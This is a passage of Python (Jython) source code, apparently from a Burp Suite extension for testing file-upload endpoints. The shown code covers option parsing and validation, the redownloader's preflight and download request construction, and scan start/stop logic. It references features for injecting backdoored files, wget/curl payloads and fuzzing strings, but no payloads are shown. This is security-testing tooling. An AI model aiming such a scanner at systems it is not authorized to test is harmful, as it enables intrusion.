        self.lbl_fuzzer_known_mutations, self.tf_fuzzer_known_mutations = self.small_tf("Number of tests with known fuzzing strings:",
                                                     str(self.fuzzer_known_mutations))
        # End fuzzer part

    def get_enabled_file_formats(self):
        formats = set()
        for file_format in self._all_file_formats:
            if self.file_formats[file_format].isSelected():
                formats.add("." + file_format)
        return formats

    def _process_python_str(self, input):
        output = input
        if input.startswith(BurpExtender.PYTHON_STR_MARKER_START) and input.endswith(BurpExtender.PYTHON_STR_MARKER_END):
            value = input[len(BurpExtender.PYTHON_STR_MARKER_START):-len(BurpExtender.PYTHON_STR_MARKER_END)]
            try:
                parsed = ast.literal_eval(value)
            except (ValueError, SyntaxError), e:
                print "Issue when processing your specified", input
                print e
            if isinstance(parsed, str):
                output = parsed
        return output

    #
    # UI: implement what happens when options are changed
    #

    def actionPerformed(self, actionEvent):
        self.insertUpdate(actionEvent)

    def changedUpdate(self, document):
        pass

    def removeUpdate(self, document):
        self.insertUpdate(document)

    def insertUpdate(self, _):

        if self.disable_action_listener:
            return

        # General:
        try:
            self.throttle_time = float(FloydsHelpers.u2s(self.tf_throttle_time.getText()))
            OptionsPanel.mark_configured(self.lbl_throttle_time)
        except ValueError:
            self.throttle_time = 0.0
            OptionsPanel.mark_misconfigured(self.lbl_throttle_time)
        
        try:
            self.sleep_time = float(FloydsHelpers.u2s(self.tf_sleep_time.getText()))
            OptionsPanel.mark_configured(self.lbl_sleep_time)
        except ValueError:
            self.sleep_time = 6.0
            OptionsPanel.mark_misconfigured(self.lbl_sleep_time)

        self.create_log = self.cb_create_log.isSelected()
        self.replace_filename = self.cb_replace_filename.isSelected()
        self.replace_ct = self.cb_replace_ct.isSelected()
        self.replace_filesize = self.cb_replace_filesize.isSelected()
        self.wget_curl_payloads = self.cb_wget_curl_payloads.isSelected()

        fi_misconfigured = False
        fi_disabled = False
        # FlexiInjector:
        if self.fi_filepath == FloydsHelpers.u2s(self.tf_fi_filepath.getText()):
            if not self.fi_filepath:
                # Looks strange when headline disabled, so use configured here
                OptionsPanel.mark_configured(self.lbl_flexi_injector)
                OptionsPanel.mark_disabled(self.lbl_filepath)
                fi_disabled = True
            # no new file specified
            self.fi_filemime = FloydsHelpers.u2s(self.tf_fi_filemime.getText())
        else:
            # a new file was specified
            self.fi_filepath = FloydsHelpers.u2s(self.tf_fi_filepath.getText())
            if not self.fi_filepath:
                OptionsPanel.mark_disabled(self.lbl_flexi_injector)
                OptionsPanel.mark_disabled(self.lbl_filepath)
                fi_disabled = True
            else:
                if os.path.basename(self.fi_filepath):
                    self.fi_ofilename = os.path.basename(self.fi_filepath)
                try:
                    self.fi_ocontent = str(file(self.fi_filepath, "rb").read())
                except:
                    OptionsPanel.mark_misconfigured(self.lbl_flexi_injector)
                    OptionsPanel.mark_misconfigured(self.lbl_filepath)
                    fi_misconfigured = True
                    self.fi_filepath = ''
                    self.fi_filemime = ''
                    self.fi_ofilename = None
                    self.fi_ocontent = None
                else:
                    self.fi_filemime = FloydsHelpers.u2s(self.tf_fi_filemime.getText())
                    if not self.fi_filemime:
                        detected_mime = FloydsHelpers.mime_type_from_ext(os.path.splitext(self.fi_ofilename)[1])
                        if detected_mime:
                            self.fi_filemime = detected_mime
                            self.tf_fi_filemime.setText(self.fi_filemime)
                            OptionsPanel.mark_configured(self.lbl_flexi_injector)
                            OptionsPanel.mark_configured(self.lbl_filepath)


        if fi_misconfigured:
            OptionsPanel.mark_disabled(self.lbl_filemime)
        elif fi_disabled:
            OptionsPanel.mark_disabled(self.lbl_filemime)
        elif not self.fi_filemime or '/' not in self.fi_filemime:
            OptionsPanel.mark_misconfigured(self.lbl_flexi_injector)
            OptionsPanel.mark_misconfigured(self.lbl_filemime)
        else:
            OptionsPanel.mark_configured(self.lbl_flexi_injector)
            OptionsPanel.mark_configured(self.lbl_filemime)
            OptionsPanel.mark_configured(self.lbl_filepath)

        # Image Formating:
        try:
            self.image_height = int(FloydsHelpers.u2s(self.tf_image_height.getText()))
            OptionsPanel.mark_configured(self.lbl_image_height)
        except Exception, e:
            print "Exception, tf_image_height", FloydsHelpers.u2s(self.tf_image_height.getText()), "is not numeric"
            self.image_height = 200
            OptionsPanel.mark_misconfigured(self.lbl_image_height)
        try:
            self.image_width = int(FloydsHelpers.u2s(self.tf_image_width.getText()))
            OptionsPanel.mark_configured(self.lbl_image_width)
        except Exception, e:
            print "Exception, tf_image_width", FloydsHelpers.u2s(self.tf_image_width.getText()), "is not numeric"
            self.image_width = 200
            OptionsPanel.mark_misconfigured(self.lbl_image_width)
        if self._global_options and self.show_exiftool_field:
            self.image_exiftool = FloydsHelpers.u2s(self.tf_image_exiftool.getText())
            if not self.image_exiftool:
                OptionsPanel.mark_disabled(self.lbl_image_exiftool)
            else:
                bi = BackdooredFile(None, self.image_exiftool)
                if bi.exiftool_present():
                    OptionsPanel.mark_configured(self.lbl_image_exiftool)
                else:
                    OptionsPanel.mark_misconfigured(self.lbl_image_exiftool)

        # Redownloader:
        if not self._global_options:
            self.check_redl_config_no_requests()

        # Recursive Uploader
        self.ru_dirpath = FloydsHelpers.u2s(self.tf_ru_dirpath.getText())
        if not self.ru_dirpath:
            OptionsPanel.mark_disabled(self.lbl_ru_dirpath)
            # Looks strange when headline disabled, so use configured here
            OptionsPanel.mark_configured(self.lbl_recursive_uploader)
        elif os.path.isdir(self.ru_dirpath):
            OptionsPanel.mark_configured(self.lbl_ru_dirpath)
            OptionsPanel.mark_configured(self.lbl_recursive_uploader)
        else:
            self.ru_dirpath = ''
            OptionsPanel.mark_misconfigured(self.lbl_ru_dirpath)
            OptionsPanel.mark_misconfigured(self.lbl_recursive_uploader)
        self.ru_keep_filename = self.cb_ru_keep_filename.isSelected()
        self.ru_keep_file_extension = self.cb_ru_keep_file_extension.isSelected()
        self.ru_keep_mime_type = self.cb_ru_keep_mime_type.isSelected()
        self.ru_believe_file_extension = self.cb_ru_believe_file_extension.isSelected()
        self.ru_guess_file_ext = self.cb_ru_guess_file_ext.isSelected()
        self.ru_combine_with_replacer = self.cb_ru_combine_with_replacer.isSelected()

        # Fuzzer:
        try:
            self.fuzzer_random_mutations = int(FloydsHelpers.u2s(self.tf_fuzzer_random_mutations.getText()))
            OptionsPanel.mark_configured(self.lbl_fuzzer_random_mutations)
        except:
            print "Exception, fuzzer_random_mutations", FloydsHelpers.u2s(self.tf_fuzzer_random_mutations.getText()), "is not numeric"
            self.fuzzer_random_mutations = 10
            OptionsPanel.mark_misconfigured(self.lbl_fuzzer_random_mutations)
        try:
            self.fuzzer_known_mutations = int(FloydsHelpers.u2s(self.tf_fuzzer_known_mutations.getText()))
            OptionsPanel.mark_configured(self.lbl_fuzzer_known_mutations)
        except:
            print "Exception, fuzzer_known_mutations", FloydsHelpers.u2s(self.tf_fuzzer_known_mutations.getText()), "is not numeric"
            self.fuzzer_known_mutations = 10
            OptionsPanel.mark_misconfigured(self.lbl_fuzzer_known_mutations)

        self._only_show_necessary_ui()

    def _only_show_necessary_ui(self):
        # Selectively hide/unhide certain options

        # Show or hide modules
        for name in self.modules:
            self.modules[name].setVisible(self.cb_show_modules.isSelected())
        for name in self.module_labels:
            self.module_labels[name].setVisible(self.cb_show_modules.isSelected())

        # Show or hide formats
        for name in self.file_formats:
            self.file_formats[name].setVisible(self.cb_show_formats.isSelected())
        for name in self.file_format_labels:
            self.file_format_labels[name].setVisible(self.cb_show_formats.isSelected())

        # Recursive Uploader
        state = bool(self.modules['recursive_uploader'].isSelected())
        self.lbl_recursive_uploader.setVisible(state)
        self.tf_ru_dirpath.setVisible(state)
        self.lbl_ru_dirpath.setVisible(state)
        self.cb_ru_keep_filename.setVisible(state)
        self.lbl_ru_keep_filename.setVisible(state)
        self.cb_ru_keep_file_extension.setVisible(state)
        self.lbl_ru_keep_file_extension.setVisible(state)
        self.cb_ru_keep_mime_type.setVisible(state)
        self.lbl_ru_keep_mime_type.setVisible(state)
        self.cb_ru_believe_file_extension.setVisible(state)
        self.lbl_ru_believe_file_extension.setVisible(state)
        self.cb_ru_guess_file_ext.setVisible(state)
        self.lbl_ru_guess_file_ext.setVisible(state)
        self.cb_ru_combine_with_replacer.setVisible(state)
        self.lbl_ru_combine_with_replacer.setVisible(state)

        # Fuzzer
        state = bool(self.modules['fuzzer'].isSelected())
        self.lbl_fuzzer.setVisible(state)
        self.lbl_fuzzer_random_mutations.setVisible(state)
        self.tf_fuzzer_random_mutations.setVisible(state)
        self.lbl_fuzzer_known_mutations.setVisible(state)
        self.tf_fuzzer_known_mutations.setVisible(state)

    @staticmethod
    def mark_configured(elem):
        elem.setOpaque(False)
        elem.setBackground(OptionsPanel.BACKGROUND_COLOR)
        elem.setForeground(OptionsPanel.FOREGROUND_COLOR)

    @staticmethod
    def mark_misconfigured(elem):
        elem.setOpaque(True)
        elem.setBackground(Color(252, 103, 118, 255))
        elem.setForeground(OptionsPanel.FOREGROUND_COLOR)

    @staticmethod
    def mark_disabled(elem):
        elem.setOpaque(True)
        elem.setBackground(OptionsPanel.BACKGROUND_COLOR)
        darkness = 128
        elem.setForeground(Color(darkness, darkness, darkness, 255))

    def _test_preflight(self, event):
        self.scan_controler.lbl_parser.setText("Configuration status: Sending preflight request...")
        OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
        self.scan_controler.btn_preflight.setEnabled(False)
        Thread(RunnableFunction(self._test_preflight_thread)).start()

    def _test_preflight_thread(self):
        msg = FloydsHelpers.jb2ps(self.scan_controler.preflight_req_view.getMessage())
        if msg:
            # print "_test_preflight_thread", self.scan_controler.preflight_req_service
            msg = msg.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
            resp = self._callbacks.makeHttpRequest(self.scan_controler.preflight_req_service, msg).getResponse()
            # print "Testing preflight ", self.scan_controler.preflight_req_service
            if resp:
                resp = FloydsHelpers.jb2ps(resp)
                self.scan_controler.set_preflight_resp(resp)
                self.check_redl_config_no_requests(recalculate_upload=True)
            else:
                self.scan_controler.lbl_parser.setText("Configuration status: Did not receive a response to the preflight request!")
                OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
            self.scan_controler.btn_preflight.setEnabled(True)
        else:
            self.scan_controler.lbl_parser.setText("Configuration status: Preflight request message not available")
            OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
            self.scan_controler.btn_preflight.setEnabled(False)

    def _test_configuration(self, event):
        self.scan_controler.lbl_parser.setText("Configuration status: Sending ReDownloader request...")
        OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
        self.scan_controler.btn_test.setEnabled(False)
        Thread(RunnableFunction(self._test_configuration_thread)).start()

    def _test_configuration_thread(self):
        msg = FloydsHelpers.jb2ps(self.scan_controler.redownload_req_view.getMessage())
        if msg and self.scan_controler.redownload_req_service:
            # print "_test_configuration_thread", self.scan_controler.redownload_req_service
            msg = msg.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
            resp = self._callbacks.makeHttpRequest(self.scan_controler.redownload_req_service, msg).getResponse()
            if resp:
                resp = FloydsHelpers.jb2ps(resp)
                self.scan_controler.set_redownload_resp(resp)
            else:
                self.scan_controler.lbl_parser.setText("Configuration status: Did not receive a response to the ReDownloader request!")
                OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
            self.scan_controler.btn_test.setEnabled(True)
        else:
            self.scan_controler.lbl_parser.setText("Configuration status: ReDownload request message/service not available")
            OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
            self.scan_controler.btn_preflight.setEnabled(True)

    def check_redl_config_no_requests(self, recalculate_upload=False):
        # TODO: By now this is such a mess, that no changes are possible without breaking everything
        # Refactor, but first create a state diagram. The dependencies are crazy, eg. if we want to gray out
        # the start button on misconfiguration, then we need to check if the scan is running when we enable it again
        # when a correct configuration is found, etc.
        
        # temp var that flags if anything is misconfigured
        misconfiguration = False

        # we don't want to destroy changes in the requests if the user changed any options
        # we only recalculate them if necessary
        recalculate_preflight = not self.redl_parse_preflight_url == FloydsHelpers.u2s(self.tf_redl_parse_preflight_url.getText())
        # however, the redownload requests is nearly always recalculated when any of those options are changed:
        recalculate_upload = recalculate_upload or recalculate_preflight or \
            not self.redl_start_marker == FloydsHelpers.u2s(self.tf_redl_start_marker.getText()) or \
            not self.redl_end_marker == FloydsHelpers.u2s(self.tf_redl_end_marker.getText()) or \
            not self.redl_repl_backslash == self.cb_redl_repl_backslash.isSelected() or \
            not self.redl_prefix == FloydsHelpers.u2s(self.tf_redl_prefix.getText()) or \
            not self.redl_suffix == FloydsHelpers.u2s(self.tf_redl_suffix.getText()) or \
            not self.redl_static_url == FloydsHelpers.u2s(self.tf_redl_static_url.getText())

        self.redl_start_marker = FloydsHelpers.u2s(self.tf_redl_start_marker.getText())
        self.redl_start_marker_transformed = self._process_python_str(self.redl_start_marker)
        if self.redl_start_marker_transformed:
            OptionsPanel.mark_configured(self.lbl_redl_start_marker)
        else:
            OptionsPanel.mark_disabled(self.lbl_redl_start_marker)
        self.redl_end_marker = FloydsHelpers.u2s(self.tf_redl_end_marker.getText())
        self.redl_end_marker_transformed = self._process_python_str(self.redl_end_marker)
        if self.redl_end_marker_transformed:
            OptionsPanel.mark_configured(self.lbl_redl_end_marker)
        else:
            OptionsPanel.mark_disabled(self.lbl_redl_end_marker)
        self.redl_repl_backslash = self.cb_redl_repl_backslash.isSelected()

        # Preflight URL
        preflight_misconfigured = False
        self.redl_parse_preflight_url = FloydsHelpers.u2s(self.tf_redl_parse_preflight_url.getText())
        if self.redl_parse_preflight_url == "":
            OptionsPanel.mark_disabled(self.lbl_redl_parse_preflight_url)
            self.scan_controler.disable_preflight()
        elif recalculate_preflight:
            # First, make sure we calculate it based on the correct upload request/response taken from the UI
            self.scan_controler.update_brr_from_ui()
            if self.redl_parse_preflight_url.startswith("http://") or self.redl_parse_preflight_url.startswith("https://"):
                s = CustomHttpService(self.redl_parse_preflight_url)
                if s.getHost() and s.getPort() and s.getProtocol():
                    service_preflight, preflight_req = self._calculate_preflight_request(self.scan_controler.brr)
                    if service_preflight and preflight_req:
                        self.scan_controler.set_preflight_req(service_preflight, preflight_req)
                        OptionsPanel.mark_configured(self.lbl_redl_parse_preflight_url)
                    else:
                        preflight_misconfigured = True
                else:
                    preflight_misconfigured = True

            elif self.redl_parse_preflight_url.startswith("/"):
                service_preflight, preflight_req = self._calculate_preflight_request(self.scan_controler.brr)
                if service_preflight and preflight_req:
                    self.scan_controler.set_preflight_req(service_preflight, preflight_req)
                    OptionsPanel.mark_configured(self.lbl_redl_parse_preflight_url)
                else:
                    preflight_misconfigured = True
            else:
                preflight_misconfigured = True
        if preflight_misconfigured:
            OptionsPanel.mark_misconfigured(self.lbl_redl_parse_preflight_url)
            self.scan_controler.disable_preflight()
            misconfiguration = True

        self.redl_prefix = FloydsHelpers.u2s(self.tf_redl_prefix.getText())
        self.redl_suffix = FloydsHelpers.u2s(self.tf_redl_suffix.getText())
        self.redl_static_url = FloydsHelpers.u2s(self.tf_redl_static_url.getText())
        if not self.redl_static_url:
            OptionsPanel.mark_disabled(self.lbl_redl_static_url)
        else:
            if self.redl_static_url.startswith("http://") or self.redl_static_url.startswith("https://"):
                try:
                    if CustomHttpService(self.redl_static_url) and CustomHttpService(self.redl_static_url).getHost() and \
                            urlparse.urlparse(self.redl_static_url):
                        OptionsPanel.mark_configured(self.lbl_redl_static_url)
                    else:
                        OptionsPanel.mark_misconfigured(self.lbl_redl_static_url)
                        misconfiguration = True
                except:
                    OptionsPanel.mark_misconfigured(self.lbl_redl_static_url)
                    misconfiguration = True
            elif self.redl_static_url.startswith("/"):
                OptionsPanel.mark_configured(self.lbl_redl_static_url)
            else:
                OptionsPanel.mark_misconfigured(self.lbl_redl_static_url)
                misconfiguration = True

        # Now check if the redownloader is configured at all
        if recalculate_upload:
            # First, make sure we calculate it based on the correct upload request/response taken from the UI
            self.scan_controler.update_brr_from_ui()
            self.redl_configured = False
            if misconfiguration:
                OptionsPanel.mark_misconfigured(self.lbl_redl)
                self.scan_controler.lbl_parser.setText("Configuration status: Redownload parser misconfigured")
                OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
                self.scan_controler.disable_redownload()
                self.redl_configured = False
            elif self.redl_start_marker_transformed and self.redl_end_marker_transformed:
                OptionsPanel.mark_configured(self.lbl_redl)
                # This means for sure this is prefered over the static URL (even when misconfigured)
                OptionsPanel.mark_disabled(self.lbl_redl_static_url)
                resp = None
                if self.redl_parse_preflight_url:
                    if self.scan_controler.preflight_resp_view.getMessage():
                        resp = FloydsHelpers.jb2ps(self.scan_controler.preflight_resp_view.getMessage())
                    else:
                        self.scan_controler.lbl_parser.setText("Configuration status: Parse with preflight ready for test, check requests manually first!")
                        OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
                        self.scan_controler.btn_start.setText("Start scan without ReDownloader")
                        self.scan_controler.btn_test.setEnabled(True)
                        self.redl_configured = False
                else:
                    resp = FloydsHelpers.jb2ps(self.scan_controler.upload_resp_view.getMessage())
                if resp:
                    multipart_file_name = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE,
                                                                        FloydsHelpers.jb2ps(self.scan_controler.upload_req_view.getMessage())).getBaseValue()
                    redownload_file_name = self.fi_ofilename or multipart_file_name or "example.jpeg"
                    redl_start_marker = self.redl_start_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, redownload_file_name)
                    redl_end_marker = self.redl_end_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, redownload_file_name)
                    parsed_content = FloydsHelpers.between_markers(resp, redl_start_marker, redl_end_marker)
                    if parsed_content:
                        self.scan_controler.lbl_parser.setText("Configuration status: Simple parse ready for test, check requests manually first!")
                        OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
                        self.scan_controler.btn_start.setText("Start scan without ReDownloader")

                        service, req = self._calculate_download_request(self.scan_controler.brr, resp, redownload_file_name)
                        if service and req:
                            self.scan_controler.set_redownload_req(service, req)
                        self.redl_configured = True
                    else:
                        misconfiguration = True
                        OptionsPanel.mark_misconfigured(self.lbl_redl)
                        if not redl_start_marker in resp:
                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no start marker " + redl_start_marker + " in response")
                        elif not redl_end_marker in resp:
                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no end marker " + redl_end_marker + " in response")
                        else:
                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no content between " + redl_start_marker + " and " + redl_end_marker)
                        OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
                        OptionsPanel.mark_misconfigured(self.lbl_redl)
                        OptionsPanel.mark_misconfigured(self.lbl_redl_start_marker)
                        OptionsPanel.mark_misconfigured(self.lbl_redl_end_marker)
                        self.scan_controler.disable_redownload()
                        self.redl_configured = False
            elif self.redl_static_url:
                OptionsPanel.mark_configured(self.lbl_redl)
                self.scan_controler.lbl_parser.setText("Configuration status:  Static URL ready for test, check requests manually first!")
                OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
                multipart_file_name = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE,
                                                                    FloydsHelpers.jb2ps(self.scan_controler.upload_req_view.getMessage())).getBaseValue()
                redownload_file_name = self.fi_ofilename or multipart_file_name or "example.jpeg"
                service, req = self._calculate_download_request(self.scan_controler.brr, None, redownload_file_name)
                self.scan_controler.set_redownload_req(service, req)
                self.redl_configured = True
            else:
                # As it looks strange when the headline is greyed out, we take configured here:
                # self._mark_disabled(self.lbl_redl)
                OptionsPanel.mark_configured(self.lbl_redl)
                self.scan_controler.lbl_parser.setText("Configuration status: Redownload parser not configured")
                OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
                self.scan_controler.disable_redownload()
                self.redl_configured = False

        return not misconfiguration

    def _start_scan(self, event):
        # The idea was once to additionally lock all UI elements of the options
        # so users can't change running configuration. But I actually often check the "Done Uploads" checkbox
        # and additionally other Burp tools also allow changing running configs, so I think that's fine
        self.scan_controler.btn_start.setEnabled(False)
        self.scan_controler.btn_stop.setEnabled(True)
        self.scan_controler.lbl_status.setText("Scan status: Scan running")
        self.scan_controler.scan_running = True
        if DEBUG_MODE:
            Thread(RunnableFunction(self._start_profile_thread)).start()
        else:
            Thread(RunnableFunction(self._start_scan_thread)).start()

    def _start_profile_thread(self):
        profile.runctx('self._start_scan_thread()', globals(), locals())

    def _start_scan_thread(self):
        # First, let's update the "base request response" we are going to use from what the user chose on the UI
        self.scan_controler.update_brr_from_ui()

        # First, try to run the FlexiInjector:
        flexiinjector_ran = self._burp_extender.run_flexiinjector(self.scan_controler.brr, self)
        # If that didn't work (eg. not configured), fallback to MultipartInjector:
        if not flexiinjector_ran:
            print "Does not seem to be a FlexiInjector request."
            # Multipart:
            # A little trickier, as we need to mimic an injectionPoint provider...
            insertionPoint = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE, FloydsHelpers.jb2ps(self.scan_controler.brr.getRequest()))
            if not insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_PARAM_MULTIPART_ATTR:
                if not self.fi_filepath:
                    self.scan_controler.lbl_parser.setText("Configuration status: You didn't configure FlexiInjector, but this request was also not detected as being multipart. Aborting!")
                else:
                    self.scan_controler.lbl_parser.setText("Configuration status: FlexiInjector configured, but file content not found in upload request. Rare case of JavaScript image changes? Aborting!")
                OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
                self.scan_was_stopped()
                return
            self._burp_extender.doActiveScan(self.scan_controler.brr, insertionPoint, options=self)

    def stop_scan(self, event):
        self.scan_controler.lbl_status.setText("Scan status: Stopping scan, this might take a while...")
        self.scan_controler.requesting_stop = True

    def scan_was_stopped(self):
        self.scan_controler.scan_running = False
        self.scan_controler.requesting_stop = False
        self.scan_controler.btn_start.setEnabled(True)
        self.scan_controler.btn_stop.setEnabled(False)
        self.scan_controler.lbl_status.setText("Scan status: Scan stopped/finished")

    def _create_template_request(self, base_request_response, url_path, service):
        iRequestInfo = self._helpers.analyzeRequest(base_request_response)
        new_req = "GET " + url_path + " HTTP/1.1" + BurpExtender.NEWLINE
        headers = iRequestInfo.getHeaders()
        # very strange, Burp seems to include the status line in .getHeaders()...
        headers = headers[1:]
        new_headers = []
        for header in headers:
            is_bad_header = False
            for bad_header in BurpExtender.REDL_URL_BAD_HEADERS:
                if header.lower().startswith(bad_header):
                    is_bad_header = True
                    break
            if is_bad_header:
                continue
            if header.lower().startswith("host:"):
                if service.getHost():
                    hh = "Host: " + FloydsHelpers.u2s(service.getHost())
                    if service.getPort() not in (80, 443):
                        hh += ":" + str(service.getPort())
                    new_headers.append(hh)
                continue
            if header.lower().startswith("cookie:") or header.lower().startswith("authorization:"):
                if service.getHost() and FloydsHelpers.u2s(service.getHost()) == FloydsHelpers.u2s(base_request_response.getHttpService().getHost()) and \
                service.getPort() == base_request_response.getHttpService().getPort():
                    new_headers.append(header)
                continue
            new_headers.append(header)
        new_headers.append("Accept: */*")

        new_headers = BurpExtender.NEWLINE.join(new_headers)
        new_req += new_headers
        new_req += BurpExtender.NEWLINE * 2
        return new_req

    def _use_template_request(self, base_request_response, url_path, service):
        iRequestInfo = self._helpers.analyzeRequest(base_request_response)
        req = FloydsHelpers.jb2ps(base_request_response.getRequest())
        method = req.split(" ", 1)[0]
        new_req = method + " " + url_path + " HTTP/1.1" + BurpExtender.NEWLINE
        headers = iRequestInfo.getHeaders()
        # very strange, Burp seems to include the status line in .getHeaders()...
        headers = headers[1:]
        new_headers = []
        for header in headers:
            header = FloydsHelpers.u2s(header)
            # We always fix cookie and authorization headers
            if header.lower().startswith("cookie:") or header.lower().startswith("authorization:"):
                if FloydsHelpers.u2s(service.getHost()) == FloydsHelpers.u2s(base_request_response.getHttpService().getHost()) and \
                                service.getPort() == base_request_response.getHttpService().getPort():
                    new_headers.append(header)
                continue
            new_headers.append(header)

        new_headers = BurpExtender.NEWLINE.join(new_headers)
        body = req[iRequestInfo.getBodyOffset():]
        if len(body) > 0:
            new_headers = FloydsHelpers.fix_content_length(new_headers, len(body), BurpExtender.NEWLINE)
        new_req += new_headers
        new_req += BurpExtender.NEWLINE * 2
        new_req += body
        return new_req

    def _redownloader_calculate_service(self, url_path, service):
        if url_path.startswith("http://") or url_path.startswith("https://"):
            service = CustomHttpService(url_path)
            u = urlparse.urlparse(url_path)
            url_path = u.path
            if u.params:
                url_path += ";" + u.params
            if u.query:
                url_path += "?" + u.query
        if url_path == '':  # for http://example.org the url_path is empty
            url_path = "/"
        return url_path, service

    def _calculate_preflight_request(self, brr, use_from_ui=False):
        if self.redl_parse_preflight_url:
            service = brr.getHttpService()
            url_path_preflight, service_preflight = self._redownloader_calculate_service(self.redl_parse_preflight_url, service)
            if service_preflight.getHost():
                if use_from_ui:
                    preflight_req = self._use_template_request(brr, url_path_preflight, service_preflight)
                else:
                    preflight_req = self._create_template_request(brr, url_path_preflight, service_preflight)
                return service_preflight, preflight_req
        return None, None

    def _calculate_download_request(self, brr, resp, sent_filename, use_from_ui=False):
        prefix = self.redl_prefix.replace(BurpExtender.REDL_FILENAME_MARKER, urllib.quote(sent_filename))
        suffix = self.redl_suffix.replace(BurpExtender.REDL_FILENAME_MARKER, urllib.quote(sent_filename))
        redl_start_marker = self.redl_start_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, sent_filename)
        redl_end_marker = self.redl_end_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, sent_filename)
        service = brr.getHttpService()
        if resp and redl_start_marker and redl_end_marker:
            url_path = FloydsHelpers.between_markers(resp, redl_start_marker, redl_end_marker)
            if url_path:
                if self.redl_repl_backslash:
                    url_path = url_path.replace("\\/", "/")
                url_path = prefix + url_path + suffix
                url_path, service = self._redownloader_calculate_service(url_path, service)
                if use_from_ui:
                    service = self.scan_controler.redownload_req_service
                    new_req = self._use_template_request(brr, url_path, service)
                    # Now make sure we scan this host in passive checks:
                    upload_url = FloydsHelpers.u2s(self._helpers.analyzeRequest(self.scan_controler.brr).getUrl().toString())
                    redownload_url = CustomHttpService.to_url(service)
                    self._burp_extender.dl_matchers.add_scope(upload_url, redownload_url)
                else:
                    new_req = self._create_template_request(brr, url_path, service)
                return service, new_req
        elif self.redl_static_url:
            url_path = self.redl_static_url.replace(BurpExtender.REDL_FILENAME_MARKER, urllib.quote(sent_filename))
            url_path, service = self._redownloader_calculate_service(url_path, service)
            if use_from_ui:
                new_req = self._use_template_request(brr, url_path, service)
                # Now make sure we scan this host in passive checks:
                upload_url = FloydsHelpers.u2s(self._helpers.analyzeRequest(self.scan_controler.brr).getUrl().toString())
                redownload_url = CustomHttpService.to_url(service)
                self._burp_extender.dl_matchers.add_scope(upload_url, redownload_url)
            else:
                new_req = self._create_template_request(brr, url_path, service)
            return service, new_req
        return None, None


    def redownloader_try_redownload(self, resp, sent_filename):
        preflight_rr = None
        download_rr = None
        preflight_request = self.scan_controler.preflight_req_view.getMessage()
        if preflight_request:
            brr = CustomRequestResponse("", "", self.scan_controler.preflight_req_service, preflight_request, None)
            service, req = self._calculate_preflight_request(brr, use_from_ui=True)
            if service and req:
                req = req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
                # Overwrite the upload response to be parsed with the preflight response to be parsed:
                r = self._callbacks.makeHttpRequest(service, req).getResponse()
                if r:
                    preflight_rr = CustomRequestResponse('', '', service, req, r)
                    resp = FloydsHelpers.jb2ps(r)
                else:
                    print "No Preflight response, aborting redownload for: \n", preflight_request
                    return None, None
            else:
                print "No Preflight request could be calculated, aborting redownload for: \n", preflight_request
                return None, None

        redownload_request = self.scan_controler.redownload_req_view.getMessage()
        # Also make sure the config was tested so check if a response is present
        if redownload_request and self.scan_controler.redownload_resp_view.getMessage():
            brr = CustomRequestResponse("", "", self.scan_controler.redownload_req_service, redownload_request, None)
            service, req = self._calculate_download_request(brr, resp, sent_filename, use_from_ui=True)
            if service and req:
                # This is usually "Fire and forget". The reason:
                # The response will be picked up by the processHttpMessage function and it's passive tests,
                # so no more processing of the response required here
                # However, if we want to support tests that rely on knowing what was downloaded
                # such as "fingerping", then we need to return this to the module
                # print "redownloader_try_redownload 2", service
                req = req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
                r = self._callbacks.makeHttpRequest(service, req).getResponse()
                if r:
                    download_rr = CustomRequestResponse('', '', service, req, r)
                else:
                    print "No Download response, aborting redownload for: \n", req
                    return None, None
            else:
                # Happens quiet often, eg. when the server rejected our uploaded file and gave a different response
                # Such as a 500 or 400 error, so this case is in the usual workflow
                # print "Couldn't calculate download request", unicode(service), req
                return None, None
        return preflight_rr, download_rr


class MenuItemAction(AbstractAction):

    def __init__(self, invocation, extension_object):
        self.invocation = invocation
        self.extension_object = extension_object

    def actionPerformed(self, e):
        self.extension_object.new_request_response(self.invocation)


class CloseableTab(JPanel, ActionListener):
    def __init__(self, title, pyparent, content, customize_callback, close_callback, index):
        super(JPanel, self).__init__()
        self.setOpaque(False)
        self.title = title
        self.pyparent = pyparent
        self.close_callback = close_callback
        self.index = index
        self.pyparent.add(title, content)
        index = pyparent.indexOfTab(title)
        self.lbl_title = JLabel(title)
        self.lbl_title.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 15))
        customize_callback(self.lbl_title)
        self.btn_close = JButton("x")
        self.btn_close.setPreferredSize(Dimension(18, 18)) #35, 10
        self.btn_close.setBorderPainted(False)
        self.btn_close.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 0))
        self.btn_close.setFocusPainted(False)
        self.btn_close.setContentAreaFilled(False)
        self.btn_close.setOpaque(False)
        self.btn_close.setMargin(Insets(0, 0, 0, 0))
        customize_callback(self.btn_close)
        self.gbc = GridBagConstraints()
        self.gbc.insets = Insets(0, 0, 0, 0)
        self.gbc.gridx = 0
